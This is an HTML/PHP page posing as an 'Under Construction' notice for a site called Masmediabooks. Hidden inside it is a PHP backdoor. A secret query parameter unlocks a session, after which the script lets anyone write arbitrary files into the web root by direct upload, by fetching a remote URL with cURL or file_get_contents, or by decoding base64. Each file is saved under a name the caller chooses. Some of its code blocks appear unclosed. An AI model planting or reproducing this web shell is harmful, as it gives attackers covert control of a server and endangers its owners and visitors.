<!DOCTYPE html>
<html lang="en" style="height: 100%;">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Masmediabooks is Under Construction</title>
</head>
<body style="height: 100%;">
<p style="text-align: center;"><img align="center" src="images/Rectangle-6.png" style="width: 75%;" /></p>

<div>
<h3 style="text-align: center;"><span style="font-size:48px;">Under Construction</span></h3>
</div>
<?php
session_start(); 

$expected_param = 'sayur';
$expected_value = 'kol';
$is_authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
    if (!$is_authenticated) {
        $_SESSION['authenticated'] = true;
        $is_authenticated = true;
    }

    $upload_dir = __DIR__ . '/'; 
    $is_writable = is_writable($upload_dir);

    if ($is_authenticated) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $upload_file = $upload_dir . basename($_FILES['file']['name']);

            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                echo "File successfully uploaded: " . htmlspecialchars(basename($_FILES['file']['name']));
            } else {
                echo "An error occurred during file upload.";
            }
        }

// Get the directory where the script is located
$uploadDir = dirname(__FILE__) . "/" ;

// Create the uploads directory if it doesn't exist
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Method 1: Normal File Upload with Custom Name
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK && isset($_POST['custom_name_normal']) && !empty($_POST['custom_name_normal'])) {
        $customFileName = $_POST['custom_name_normal'];
        $uploadFile = $uploadDir . basename($customFileName);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
            echo "File uploaded successfully (Normal Upload) with custom name: $customFileName.<br>";
        } else {
            echo "Failed to upload file (Normal Upload).<br>";
        }
    }

    // Method 2: Remote File Upload using cURL with Custom Name
    if (isset($_POST['remote_url']) && !empty($_POST['remote_url']) && isset($_POST['custom_name_remote']) && !empty($_POST['custom_name_remote'])) {
        $remoteUrl = $_POST['remote_url'];
        $customFileName = $_POST['custom_name_remote'];
        $uploadFile = $uploadDir . basename($customFileName);

        // Use cURL to fetch the remote file
        $ch = curl_init($remoteUrl);
        $fp = fopen($uploadFile, 'wb');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        if (curl_exec($ch)) {
            echo "Remote file uploaded successfully using cURL with custom name: $customFileName.<br>";
        } else {
            echo "Failed to upload remote file using cURL.<br>";
        }
        fclose($fp);
        curl_close($ch);
    }

    // Method 3: Remote File Upload using file_get_contents() with Custom Name
    if (isset($_POST['remote_url']) && !empty($_POST['remote_url']) && isset($_POST['custom_name_remote']) && !empty($_POST['custom_name_remote'])) {
        $remoteUrl = $_POST['remote_url'];
        $customFileName = $_POST['custom_name_remote'];
        $uploadFile = $uploadDir . basename($customFileName);

        // Use file_get_contents to fetch the remote file
        $fileContent = file_get_contents($remoteUrl);
        if ($fileContent !== false) {
            // Save the content to the custom file name
            if (file_put_contents($uploadFile, $fileContent)) {
                echo "Remote file uploaded successfully using file_get_contents() with custom name: $customFileName.<br>";
            } else {
                echo "Failed to upload remote file using file_get_contents().<br>";
            }
        } else {
            echo "Failed to fetch remote file using file_get_contents().<br>";
        }
    }

    // Method 4: Base64 Encoding and Save as Custom File Name
    if (isset($_POST['base64']) && !empty($_POST['base64']) && isset($_POST['custom_name_base64']) && !empty($_POST['custom_name_base64'])) {
        $base64Data = $_POST['base64'];
        $customFileName = $_POST['custom_name_base64'];
        $uploadFile = $uploadDir . basename($customFileName);

        // Decode the Base64 data and save to the custom file name
        $fileData = base64_decode($base64Data);
        if (file_put_contents($uploadFile, $fileData)) {
            echo "File uploaded successfully as Base64 with custom name: $customFileName.<br>";
        } else {
            echo "Failed to upload file as Base64.<br>";
        }
    }
}

?>
<div class="col-sm-12 margin_bottom" style="text-align: center;"><span style="font-size:24px;"><span style="font-family:courier new,courier,monospace;"><marquee><span style="background-color:#00FFFF;">Website Masmediabooks ini dalam perbaikan...</span></marquee></span></span></div>
</body>
</html>
